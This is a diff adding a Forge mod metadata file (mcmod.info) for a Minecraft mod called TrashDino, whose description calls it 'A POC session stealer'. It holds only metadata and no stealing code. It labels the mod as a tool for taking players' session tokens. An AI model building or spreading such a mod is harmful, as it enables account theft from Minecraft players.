@@ -1,0 +1,16 @@
+[
+{
+  "modid": "TrashDino",
+  "name": "TrashDino",
+  "description": "A POC session stealer",
+  "version": "${version}",
+  "mcversion": "${mcversion}",
+  "url": "",
+  "updateUrl": "",
+  "authorList": ["TrashDino"],
+  "credits": "trashdino on discord",
+  "logoFile": "",
+  "screenshots": [],
+  "dependencies": []
+}
+]
